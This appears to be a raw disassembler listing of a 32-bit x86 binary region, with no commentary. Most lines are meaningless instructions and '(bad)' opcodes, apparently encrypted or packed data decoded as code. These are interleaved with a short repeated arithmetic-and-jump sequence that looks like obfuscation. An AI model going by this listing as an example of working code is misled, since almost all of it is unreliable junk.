  407c2d:	xchg   ecx,eax
  407c2e:	(bad)  
  407c2f:	loop   0x407c27
  407c31:	mov    ah,0xb6
  407c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c34:	rcr    DWORD PTR [edi],cl
  407c36:	jnp    0x407c52
  407c38:	add    ch,al
  407c3a:	add    bl,dh
  407c3c:	pop    esi
  407c3d:	dec    esp
  407c3e:	fldenv [ecx-0x1fc5b1b7]
  407c44:	cwde   
  407c45:	dec    esi
  407c46:	pop    esi
  407c47:	mov    ah,BYTE PTR [eax]
  407c49:	shl    BYTE PTR [edi],cl
  407c4b:	sub    esi,DWORD PTR [edi+0x59]
  407c4e:	xchg   esi,eax
  407c4f:	div    BYTE PTR [edx+0x56]
  407c52:	push   esp
  407c53:	ret    
  407c54:	popf   
  407c55:	jbe    0x407c53
  407c57:	ins    BYTE PTR es:[edi],dx
  407c58:	neg    DWORD PTR ds:0xa469b333
  407c5e:	sub    DWORD PTR [eax-0x5c03acf3],ecx
  407c64:	jp     0x407c9c
  407c66:	arpl   bx,di
  407c68:	inc    DWORD PTR [esi+ebp*8]
  407c6b:	dec    edx
  407c6c:	mov    esp,0xc31ef7a8
  407c71:	lods   eax,DWORD PTR ds:[esi]
  407c72:	mov    edx,0xba7a45b4
  407c77:	daa    
  407c78:	and    bl,BYTE PTR [ecx+0x58212422]
  407c7e:	aas    
  407c7f:	(bad)  
  407c80:	mov    ebp,0xd99c453e
  407c85:	rol    BYTE PTR [esi-0x15],cl
  407c88:	rol    bh,cl
  407c8a:	mov    ebx,0x8e3e047a
  407c8f:	pop    esp
  407c90:	sti    
  407c91:	mov    ds:0x6a39b10e,eax
  407c96:	pop    ebp
  407c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c98:	bound  ebp,QWORD PTR [edx+0x668a3ce6]
  407c9e:	leave  
  407c9f:	ja     0x407c6b
  407ca1:	dec    ebx
  407ca2:	mov    ds:0x13a4ba75,eax
  407ca7:	mov    al,0x46
  407ca9:	mov    ah,0xce
  407cab:	call   0xf833:0xd0332ef0
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x239e7466]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407cf4
  407ce1:	xchg   ebp,eax
  407ce2:	loopne 0x407d4d
  407ce4:	cmp    eax,DWORD PTR [ebp+0x2db41ad3]
  407cea:	pop    edx
  407ceb:	jge    0x407d1b
  407ced:	mov    edx,0x2ff6c452
  407cf2:	push   esp
  407cf3:	sahf   
  407cf4:	fadd   QWORD PTR [eax-0x7864d716]
  407cfa:	mov    ds:0x142d1b6b,al
  407cff:	sahf   
  407d00:	xchg   eax,edx
  407d02:	add    eax,0xb479a6b2
  407d07:	push   es
  407d08:	sbb    BYTE PTR [ebp+0x42efca50],dl
  407d0e:	dec    BYTE PTR [ebx]
  407d10:	xchg   esp,eax
  407d11:	(bad)  
  407d13:	rcr    esp,cl
  407d15:	in     al,dx
  407d16:	sub    eax,0x6abfcec0
  407d1b:	test   eax,0xd25d24dd
  407d20:	or     DWORD PTR [ecx-0x938337f],ebp
  407d26:	push   0x1b
  407d28:	mov    BYTE PTR [ecx],dl
  407d2a:	sbb    eax,0x3775c887
  407d2f:	mov    ah,0x54
  407d31:	iret   
  407d32:	or     dl,BYTE PTR [ebp+0x6b]
  407d35:	jbe    0x407d71
  407d37:	xchg   edi,eax
  407d38:	mov    edx,0xa123a1d0
  407d3d:	xchg   ebx,eax
  407d3e:	addr16 int3 
  407d40:	xor    eax,0xcaa3edd6
  407d45:	repz inc esp
  407d47:	aad    0xae
  407d49:	repnz stc 
  407d4b:	clc    
  407d4c:	(bad)  
  407d4d:	jle    0x407d04
  407d4f:	xor    eax,0x5292ff84
  407d54:	pop    ds
  407d55:	scas   al,BYTE PTR es:[edi]
  407d56:	sub    al,0x11
  407d58:	xchg   ebx,eax
  407d59:	inc    esi
  407d5a:	in     al,0xb6
  407d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d5d:	and    DWORD PTR [ecx-0xb],edi
  407d60:	jb     0x407d90
  407d62:	in     al,dx
  407d63:	retf   
  407d64:	jnp    0x407d04
  407d66:	ret    
  407d67:	sar    DWORD PTR [eax+0x1a90fc5a],1
  407d6d:	in     eax,0x58
  407d6f:	and    eax,0x930b1901
  407d74:	bound  esi,QWORD PTR [esi-0x289cd9a4]
  407d7a:	ret    0x3e2a
  407d7d:	jb     0x407d1c
  407d7f:	sbb    al,0xa9
  407d81:	ror    BYTE PTR [edi-0x79503af1],0x90
  407d88:	mov    ds:0x719602f6,al
  407d8d:	jmp    0x407d22
  407d8f:	dec    edi
  407d90:	jmp    0x98eba5be
  407d95:	inc    edi
  407d96:	sbb    al,0x9
  407d98:	out    0x5f,al
  407d9a:	mov    edx,ecx
  407d9c:	rol    ebp,cl
  407d9e:	xor    al,0x85
  407da0:	in     eax,0x30
  407da2:	aaa    
  407da3:	stos   DWORD PTR es:[edi],eax
  407da4:	push   ebx
  407da5:	mov    ecx,0xac96ae20
  407daa:	xor    al,0x66
  407dac:	mov    eax,ds:0x181e338d
  407db1:	mov    bh,0xeb
  407db3:	stos   DWORD PTR es:[edi],eax
  407db4:	jp     0x407e19
  407db6:	push   0x40
  407db8:	mov    DWORD PTR [edi+0x7e],0xe6a18865
  407dbf:	pop    eax
  407dc0:	loope  0x407e02
  407dc2:	mov    edx,0x66804ab
  407dc7:	lds    ecx,FWORD PTR [ebx+0x39]
  407dca:	or     ah,al
  407dcc:	stc    
  407dcd:	pop    ebx
  407dce:	pop    edi
  407dcf:	cmp    eax,0x852343f
  407dd4:	or     edx,edi
  407dd6:	jno    0x407d5a
  407dd8:	mov    ecx,0x78bbbd1c
  407ddd:	mov    ds:0xf5ba19e3,eax
  407de2:	pusha  
  407de3:	ins    DWORD PTR es:[edi],dx
  407de4:	aas    
  407de5:	test   al,0x18
  407de7:	xlat   BYTE PTR ds:[ebx]
  407de8:	out    dx,al
  407de9:	cmp    eax,DWORD PTR [edi]
  407deb:	lahf   
  407dec:	push   es
  407ded:	jo     0x407dd6
  407def:	dec    esp
  407df0:	sti    
  407df1:	sub    eax,DWORD PTR [ebp-0x70]
  407df4:	inc    eax
  407df5:	mov    al,ds:0x36e0122c
  407dfa:	dec    esi
  407dfb:	(bad)  
  407dfc:	test   DWORD PTR [ecx+esi*2],0x43bb7d57
  407e03:	jle    0x407dde
  407e05:	(bad)  
  407e07:	mov    ds:0x5cbd92ac,eax
  407e0c:	jmp    0x407e64
  407e0e:	mov    ah,0xba
  407e10:	mov    ds:0x988905b9,al
  407e15:	div    edi
  407e17:	scas   al,BYTE PTR es:[edi]
  407e18:	stc    
  407e19:	fs pop eax
  407e1b:	pop    ebx
  407e1c:	push   esi
  407e1d:	jle    0x407dbb
  407e1f:	fadd   QWORD PTR [ecx]
  407e21:	icebp  
  407e22:	add    edi,esp
  407e24:	inc    ebp
  407e25:	xor    ch,BYTE PTR [ebp-0x1f]
  407e28:	mov    es,WORD PTR [esi+0x46eebbc5]
  407e2e:	cs jb  0x407df0
  407e31:	stc    
  407e32:	mov    dl,0xef
  407e34:	xor    ch,dh
  407e36:	mov    ah,0x9b
  407e38:	pop    esp
  407e39:	pusha  
  407e3a:	mov    edx,0xe96dd476
  407e3f:	dec    eax
  407e40:	ins    BYTE PTR es:[edi],dx
  407e41:	mov    esi,0x25fcfd33
  407e46:	mov    WORD PTR ds:0xc48de783,ds
  407e4c:	mov    ds:0x49450651,eax
  407e51:	sbb    edi,DWORD PTR ds:0xe38c4e8b
  407e57:	and    DWORD PTR [edx-0x4a],0x30
  407e5b:	jnp    0x407e07
  407e5d:	xor    DWORD PTR [ebp+0x7c],esi
  407e60:	adc    BYTE PTR [ebx+esi*1-0x48d3e437],cl
  407e67:	fnstcw WORD PTR [ebx-0x1d1e1220]
  407e6d:	aad    0xb7
  407e6f:	cmp    DWORD PTR [edx-0x12],esp
  407e72:	ret    
  407e73:	xor    al,0xf
  407e75:	xchg   DWORD PTR [eax],ecx
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	add    eax,0x11e47b79
  407ea2:	int    0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407e73
  407eaa:	lods   al,BYTE PTR ds:[esi]
  407eab:	imul   ebp
  407ead:	int    0xc
  407eaf:	adc    al,0xdd
  407eb1:	mov    ebp,DWORD PTR [ecx+edi*8+0x28]
  407eb5:	inc    esp
  407eb6:	repz pop ss
  407eb8:	out    dx,al
  407eb9:	jo     0x407e71
  407ebb:	call   0x17da:0x2077437c
  407ec2:	imul   DWORD PTR ds:0x4e1544b4
  407ec8:	mov    eax,ds:0x758581da
  407ecd:	in     al,0x4c
  407ecf:	and    eax,0x8c9714aa
  407ed4:	das    
  407ed5:	out    dx,eax
  407ed6:	cmp    DWORD PTR [edi-0x60ce918e],edx
  407edc:	int3   
  407edd:	bound  esp,QWORD PTR [ebp+0x16434c75]
  407ee3:	jge    0x407f4c
  407ee5:	xor    ecx,DWORD PTR [edx-0x2d]
  407ee8:	ins    DWORD PTR es:[edi],dx
  407ee9:	cmp    eax,0xde6db836
  407eee:	es scas eax,DWORD PTR es:[edi]
  407ef0:	fucomip st,st(2)
  407ef2:	scas   eax,DWORD PTR es:[edi]
  407ef3:	lds    ecx,FWORD PTR [ecx]
  407ef5:	mov    cl,0x3a
  407ef7:	jmp    0x407f22
  407ef9:	fwait
  407efa:	add    edi,DWORD PTR ds:0x843dae33
  407f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f01:	dec    esp
  407f02:	enter  0x2542,0x59
  407f06:	dec    eax
  407f07:	xlat   BYTE PTR ds:[ebx]
  407f08:	xor    cl,BYTE PTR [edi]
  407f0a:	adc    eax,0xf576dbdd
  407f0f:	fwait
  407f10:	or     BYTE PTR ds:0x2d57f556,dl
  407f16:	sbb    BYTE PTR [edi],al
  407f18:	ds mov eax,0x597d2f99
  407f1e:	or     BYTE PTR [edx],ah
  407f20:	scas   eax,DWORD PTR es:[edi]
  407f21:	push   esi
  407f22:	and    BYTE PTR [edi+0x76d17511],cl
  407f28:	call   0x3847e816
  407f2d:	xchg   DWORD PTR [edi+0x3e],edi
  407f30:	dec    ecx
  407f31:	pop    ecx
  407f32:	not    DWORD PTR [ebx+0x72]
  407f35:	addr16 test eax,0xb63bada1
  407f3b:	scas   al,BYTE PTR es:[edi]
  407f3c:	sti    
  407f3d:	xor    BYTE PTR [edi],ch
  407f3f:	pop    ss
  407f40:	adc    esi,DWORD PTR [ebp+edi*2+0x13]
  407f44:	or     al,0x6e
  407f46:	out    0x1d,eax
  407f48:	add    dl,BYTE PTR ds:[ebx]
  407f4b:	push   edx
  407f4c:	xchg   edi,eax
  407f4d:	sbb    eax,0xad03049f
  407f52:	mov    ch,0x69
  407f54:	xchg   ebp,eax
  407f55:	pop    edi
  407f56:	(bad)  
  407f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f58:	or     BYTE PTR [ebx],al
  407f5a:	icebp  
  407f5b:	cld    
  407f5c:	jl     0x407ee8
  407f5e:	mov    edi,0x4cef0b07
  407f63:	adc    dl,BYTE PTR [ebx]
  407f65:	inc    esi
  407f66:	adc    BYTE PTR [edx-0x48],al
  407f69:	out    dx,al
  407f6a:	scas   al,BYTE PTR es:[edi]
  407f6b:	aas    
  407f6c:	fcomp  DWORD PTR [ebp+0x3e1fcb1b]
  407f72:	fimul  WORD PTR [eax-0x62b6638]
  407f78:	(bad)  
  407f79:	jg     0x407fa7
  407f7b:	mov    edi,0xef9687e
  407f80:	mov    ecx,0x381c66e2
  407f85:	ins    DWORD PTR es:[edi],dx
  407f86:	add    edx,DWORD PTR [edi]
  407f88:	fs stc 
  407f8a:	jecxz  0x407f11
  407f8c:	jb     0x407ffd
  407f8e:	jmp    FWORD PTR ds:[ebp+0x58a890a3]
  407f95:	fidiv  DWORD PTR [eax+0x51609101]
  407f9b:	mov    dl,0xac
  407f9d:	jg     0x407f6f
  407f9f:	xchg   edi,eax
  407fa0:	je     0x407f35
  407fa2:	sub    dl,bh
  407fa4:	cmp    BYTE PTR [eax+0x60db7d53],al
  407faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fab:	int    0x48
  407fad:	sbb    eax,DWORD PTR [ebp+0x61cc37e8]
  407fb3:	adc    al,0x9c
  407fb5:	add    al,0xd7
  407fb7:	shl    eax,1
  407fb9:	shr    BYTE PTR [edx+0x37b7eced],1
  407fbf:	mov    edi,edx
  407fc1:	lock mov ds:0xb6c11027,al
  407fc7:	pop    ds
  407fc8:	xchg   ebp,eax
  407fc9:	iret   
  407fca:	fwait
  407fcb:	jle    0x408037
  407fcd:	lds    ebp,FWORD PTR [ebp+esi*2+0x55683b56]
  407fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd5:	shl    esi,1
  407fd7:	add    eax,0xe2cd4ad7
  407fdc:	repnz (bad) 
  407fde:	retf   0xae63
  407fe1:	inc    ebx
  407fe2:	xchg   DWORD PTR [edi],ebp
  407fe4:	push   esi
  407fe5:	mov    esp,0x2eb5f070
  407fea:	(bad)
  407fed:	idiv   BYTE PTR [edx+0x38]
  407ff0:	fmulp  st(5),st
  407ff2:	inc    esi
  407ff3:	add    al,0xce
  407ff5:	repz ret 0x5251
  407ff9:	(bad)  
  407ffb:	jmp    0x40805a
  407ffd:	loope  0x408050
  407fff:	inc    edi
  408000:	iret   
  408001:	mov    dh,0x4
  408003:	inc    ecx
  408004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408005:	or     BYTE PTR [edx],al
  408007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408008:	in     al,0xb2
  40800a:	popa   
  40800b:	addr16 xor al,0xc
  40800e:	jnp    0x407f97
  408010:	push   0xffffffb3
  408012:	dec    esp
  408013:	xchg   ecx,eax
  408014:	icebp  
  408015:	add    BYTE PTR [eax-0x71],dh
  408018:	pop    ebx
  408019:	push   ecx
  40801a:	call   0xb1a36d69
  40801f:	adc    ch,BYTE PTR [ebp-0x2b]
  408022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408023:	(bad)  
  408025:	adc    DWORD PTR [ebx],esi
  408027:	push   ebx
  408028:	and    eax,0xdd284c30
  40802d:	add    edi,esp
  40802f:	cs gs aad 0xf0
  408033:	xchg   ebp,esi
  408035:	repz and edi,DWORD PTR [ebx+0x2]
  408039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40803a:	add    ah,BYTE PTR [ebx+0x39]
  40803d:	add    edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	out    0x8d,al
  40807b:	sub    eax,0x7ecaad7c
  408080:	jle    0x40800c
  408082:	jg     0x408102
  408084:	jle    0x4080e0
  408086:	xchg   ebp,eax
  408087:	cs std 
  408089:	push   edx
  40808a:	dec    edi
  40808b:	mov    ecx,gs
  40808d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808e:	mov    esi,eax
  408090:	dec    edi
  408091:	(bad)  
  408092:	std    
  408093:	mov    ebx,0xd03af37a
  408098:	ror    BYTE PTR [ecx-0x7e330052],0x12
  40809f:	fidivr DWORD PTR [eax]
  4080a1:	xchg   ebp,eax
  4080a2:	rcl    cl,1
  4080a4:	sub    al,0x7b
  4080a6:	jns    0x4080a7
  4080a8:	outs   dx,BYTE PTR ds:[esi]
  4080a9:	bound  esp,QWORD PTR [edi-0x3bf89eb2]
  4080af:	imul   edi,esp,0xf11eab28
  4080b5:	fistp  QWORD PTR [ebx]
  4080b7:	repnz mov esp,0x77748e8e
  4080bd:	in     eax,0x19
  4080bf:	mul    eax
  4080c1:	scas   eax,DWORD PTR es:[edi]
  4080c2:	add    eax,0xce80cc00
  4080c7:	(bad)  
  4080c8:	sub    BYTE PTR [edi],ch
  4080ca:	mov    ecx,0xe8f38dda
  4080cf:	push   0xe28349ac
  4080d4:	add    DWORD PTR [edi+0x46],ecx
  4080d7:	jo     0x408076
  4080d9:	sti    
  4080da:	out    0x54,al
  4080dc:	fcom   QWORD PTR [esi]
  4080de:	ds or  dh,cl
  4080e1:	(bad)  
  4080e3:	loop   0x408069
  4080e5:	(bad)  
  4080e7:	push   0xe037232b
  4080ec:	xchg   BYTE PTR [edi],al
  4080ee:	pop    ecx
  4080ef:	ins    DWORD PTR es:[edi],dx
  4080f0:	mov    ah,0x51
  4080f2:	and    ecx,DWORD PTR [edx+0x5c]
  4080f5:	retf   
  4080f6:	jge    0x40816d
  4080f8:	jp     0x408155
  4080fa:	mov    edx,esi
  4080fc:	inc    ebp
  4080fd:	inc    edi
  4080fe:	jb     0x40812f
  408100:	hlt    
  408101:	repz and eax,0xcc24b91c
  408107:	sar    DWORD PTR [ebx],cl
  408109:	cdq    
  40810a:	adc    bh,BYTE PTR [edi]
  40810c:	pop    ebp
  40810d:	jp     0x408100
  40810f:	lods   al,BYTE PTR ds:[esi]
  408110:	push   ds
  408111:	mov    dl,0x73
  408113:	cmp    DWORD PTR [edi-0x2a1daf79],esp
  408119:	push   0xd2728e10
  40811e:	daa    
  40811f:	pushf  
  408120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408121:	add    al,0x25
  408123:	inc    ecx
  408124:	jnp    0x40817b
  408126:	xchg   ecx,eax
  408127:	sbb    eax,0xabeb7641
  40812c:	mov    al,ds:0x7f712292
  408131:	ds loop 0x4080f7
  408134:	pop    ebx
  408135:	in     al,dx
  408136:	ffreep st(7)
  408138:	(bad)  
  408139:	cdq    
  40813a:	jb     0x408187
  40813c:	jnp    0x40813a
  40813e:	std    
  40813f:	add    BYTE PTR [ebx-0x43],bh
  408142:	jno    0x408127
  408144:	ret    0x586b
  408147:	inc    edi
  408148:	into   
  408149:	inc    DWORD PTR [esi+0x2c9a4757]
  40814f:	(bad)  
  408150:	pop    edx
  408151:	jmp    0x60e2152c
  408156:	(bad)  
  408157:	icebp  
  408158:	cmp    ch,bl
  40815a:	mov    cl,BYTE PTR [ebp-0x17b1273c]
  408160:	ret    0x6007
  408163:	mov    bl,0xc7
  408165:	mov    bl,0x47
  408167:	int    0x82
  408169:	gs mov dh,0xaf
  40816c:	push   edx
  40816d:	adc    BYTE PTR [eax-0x331cc613],ch
  408173:	ret    0xd5a8
  408176:	sbb    eax,esi
  408178:	hlt    
  408179:	outs   dx,BYTE PTR ds:[esi]
  40817a:	cmp    al,0xc8
  40817c:	mov    edx,0x8a7ef809
  408181:	pusha  
  408182:	test   ebp,edi
  408184:	dec    ecx
  408185:	dec    ebp
  408186:	mov    dh,0x54
  408188:	rol    DWORD PTR [edi],cl
  40818a:	push   0xffffffcb
  40818c:	mov    ebx,0x6d03d7b
  408191:	adc    BYTE PTR [edx-0x4bcb90e0],0x2
  408198:	dec    eax
  408199:	imul   ebx,DWORD PTR [eax-0x6],0xffffffc7
  40819d:	mov    edi,0xef4d31ab
  4081a2:	xchg   esp,eax
  4081a3:	(bad)  
  4081a4:	xlat   BYTE PTR ds:[ebx]
  4081a5:	out    dx,eax
  4081a6:	pop    edx
  4081a7:	or     eax,DWORD PTR [ecx+0x70]
  4081aa:	enter  0xcc68,0xee
  4081ae:	cwde   
  4081af:	jo     0x4081b2
  4081b1:	xchg   esp,eax
  4081b2:	pusha  
  4081b3:	lods   al,BYTE PTR ds:[esi]
  4081b4:	xor    al,0x1f
  4081b6:	aad    0x9d
  4081b8:	xchg   ecx,eax
  4081b9:	xchg   edi,eax
  4081ba:	cmp    ebp,eax
  4081bc:	jne    0x40818f
  4081be:	mov    esi,0x79cbc241
  4081c3:	imul   eax,ebp,0x4dd6926e
  4081c9:	addr16 adc al,0x88
  4081cc:	mov    ss,WORD PTR [esi]
  4081ce:	adc    al,0xae
  4081d0:	pop    esi
  4081d1:	outs   dx,DWORD PTR ds:[esi]
  4081d2:	jecxz  0x408166
  4081d4:	(bad)
  4081d9:	cmp    DWORD PTR [ebx+0x3ad7df31],ebp
  4081df:	mov    edx,0x5c7e87e
  4081e4:	arpl   WORD PTR [edi-0x3b0b300e],ax
  4081ea:	(bad)  
  4081eb:	mov    edx,0xbc571dd1
  4081f0:	lods   al,BYTE PTR cs:[esi]
  4081f2:	popf   
  4081f3:	aad    0xf8
  4081f5:	enter  0xf764,0x8b
  4081f9:	pop    eax
  4081fa:	dec    edi
  4081fb:	fdivr  st(0),st
  4081fd:	inc    edx
  4081fe:	mov    edi,0xa8b4b292
  408203:	jno    0x4081ff
  408205:	loopne 0x40821b
  408207:	jne    0x4081f8
  408209:	loopne 0x408284
  40820b:	xchg   esi,eax
  40820c:	cdq    
  40820d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40820e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40820f:	and    DWORD PTR [edi+0x41],edi
  408212:	push   0xffffff8f
  408214:	mov    ?,WORD PTR [edi]
  408216:	inc    eax
  408217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408218:	or     al,0x3
  40821a:	shr    ecx,1
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3944:0x9e7ef462
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408208
  408239:	das    
  40823a:	mov    DWORD PTR [eax+0x62],ecx
  40823d:	add    eax,0x9accecf6
  408242:	inc    esp
  408243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408244:	push   ebp
  408245:	mov    ch,0x4e
  408247:	clc    
  408248:	xlat   BYTE PTR ds:[ebx]
  408249:	in     al,0x5d
  40824b:	sbb    edx,DWORD PTR [ecx]
  40824d:	cmp    eax,0x78a11225
  408252:	shr    DWORD PTR [ebx-0x418dbffd],1
  408258:	jne    0x408272
  40825a:	retf   
  40825b:	push   DWORD PTR [edi+0x3e]
  40825e:	cs ins BYTE PTR es:[edi],dx
  408260:	mov    esi,0x1862cc05
  408265:	xor    ebx,DWORD PTR [ebp-0xb]
  408268:	mov    ah,BYTE PTR [eax-0x4b]
  40826b:	shr    BYTE PTR [ebx],1
  40826d:	push   ebx
  40826e:	xchg   DWORD PTR [edi+0x16],ebp
  408271:	mov    edx,0x7a1abad8
  408276:	stc    
  408277:	push   esi
  408278:	mov    al,0xc8
  40827a:	call   0xf7898f84
  40827f:	cmp    DWORD PTR [eax+ebp*8],esi
  408282:	aad    0xe0
  408284:	jne    0x408286
  408286:	or     DWORD PTR [edi+ebx*1-0x4a9f5871],0x2e28be7b
  408291:	pushf  
  408292:	jae    0x408262
  408294:	mov    eax,0x9e281f1
  408299:	sbb    DWORD PTR [ebx+esi*1],ebp
  40829c:	jb     0x4082df
  40829e:	xchg   esi,eax
  40829f:	push   ecx
  4082a0:	test   DWORD PTR [eax+0x7],0xb8120dcf
  4082a7:	sbb    ecx,edi
  4082a9:	add    edx,DWORD PTR [ebx-0x3d]
  4082ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ad:	out    dx,eax
  4082ae:	and    al,0x6b
  4082b0:	js     0x40823a
  4082b2:	mov    bl,0x6f
  4082b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b5:	xor    al,0xa3
  4082b7:	or     eax,DWORD PTR [ebx+0x6fa997a2]
  4082bd:	cmp    eax,0x3e2530cb
  4082c2:	outs   dx,BYTE PTR fs:[esi]
  4082c4:	jge    0x4082aa
  4082c6:	jmp    0x6b5:0xd2076871
  4082cd:	into   
  4082ce:	mov    esi,0xf6285e3b
  4082d3:	sbb    al,0x78
  4082d5:	push   ebp
  4082d6:	retf   0x94d3
  4082d9:	push   edx
  4082da:	lds    edi,FWORD PTR [esi-0x687d6e7f]
  4082e0:	and    DWORD PTR [esi-0x33],eax
  4082e3:	test   BYTE PTR [ebp+0xf5e06c],0xf3
  4082ea:	lods   al,BYTE PTR ds:[esi]
  4082eb:	cmp    ah,BYTE PTR gs:[ebx]
  4082ee:	push   edx
  4082ef:	mov    BYTE PTR [esi+0x1398bcbe],0x1c
  4082f6:	clc    
  4082f7:	jb     0x408336
  4082f9:	cmc    
  4082fa:	test   eax,0x77815aa7
  4082ff:	repnz shl DWORD PTR [eax-0xb],1
  408303:	inc    eax
  408304:	enter  0x313e,0x62
  408308:	push   edi
  408309:	in     al,0xb5
  40830b:	stos   DWORD PTR es:[edi],eax
  40830c:	or     BYTE PTR [esi+esi*8],al
  40830f:	pushf  
  408310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408311:	xchg   BYTE PTR [edi+0x556594da],al
  408317:	in     al,dx
  408318:	cmp    BYTE PTR [esi-0x4f],0x69
  40831c:	pop    eax
  40831d:	dec    edx
  40831e:	into   
  40831f:	sub    eax,0x4f5a5be4
  408324:	xlat   BYTE PTR ds:[ebx]
  408325:	mov    dl,0xf5
  408327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408328:	inc    ebx
  408329:	cwde   
  40832a:	inc    esp
  40832b:	inc    ebp
  40832c:	das    
  40832d:	pop    es
  40832e:	add    edx,DWORD PTR [esi-0x52]
  408331:	imul   esi,DWORD PTR [ebx],0xffffff99
  408334:	mov    DWORD PTR [edi-0x54],esp
  408337:	stos   BYTE PTR es:[edi],al
  408338:	push   edi
  408339:	bound  eax,QWORD PTR [eax]
  40833b:	jmp    0xab41945d
  408340:	enter  0xbaae,0x53
  408344:	mov    dh,0x7f
  408346:	loopne 0x4082d4
  408348:	bound  esp,QWORD PTR [ecx-0x4bcef0b1]
  40834e:	adc    DWORD PTR [esi],0x9858e941
  408354:	mov    cl,0xf7
  408356:	dec    eax
  408357:	or     DWORD PTR [edx+0x43],ecx
  40835a:	mov    WORD PTR [ebx+esi*8],gs
  40835d:	aaa    
  40835e:	inc    ebp
  40835f:	fdivr  DWORD PTR [edi+0x69]
  408362:	xchg   ebx,eax
  408363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408364:	fs xchg ecx,eax
  408366:	push   esp
  408367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408368:	cdq    
  408369:	jp     0x4083b0
  40836b:	and    eax,0xb67d9676
  408370:	mov    esi,0x5d8205ba
  408375:	push   ds
  408376:	push   esi
  408377:	ds pop ds
  408379:	sahf   
  40837a:	xchg   ebx,eax
  40837b:	add    ch,BYTE PTR [ebx-0x61]
  40837e:	pushf  
  40837f:	mov    cl,0x60
  408381:	in     eax,dx
  408382:	sub    ecx,eax
  408384:	sbb    BYTE PTR [eax+ebp*4+0x42],bh
  408388:	std    
  408389:	xor    ecx,DWORD PTR [edi-0x42]
  40838c:	mov    ch,BYTE PTR [ebx-0x47f80c0f]
  408392:	mov    edi,0xaed2afe6
  408397:	(bad)  
  408398:	stos   DWORD PTR es:[edi],eax
  408399:	add    cl,dl
  40839b:	imul   edi,DWORD PTR [esi-0x5f7bd811],0x4604b8ff
  4083a5:	mov    ecx,0x30510c10
  4083aa:	xchg   ch,bl
  4083ac:	mov    bl,0x9f
  4083ae:	mov    eax,ds:0x2598caf7
  4083b3:	out    0xc2,eax
  4083b5:	push   edi
  4083b6:	test   dl,0x65
  4083b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ba:	jno    0x40840a
  4083bc:	push   ss
  4083bd:	dec    ecx
  4083be:	cmp    dl,BYTE PTR [esi+0x13f1d391]
  4083c4:	scas   al,BYTE PTR es:[edi]
  4083c5:	jne    0x408361
  4083c7:	(bad)  
  4083c8:	pop    ebp
  4083c9:	inc    eax
  4083ca:	push   ecx
  4083cb:	push   ebx
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
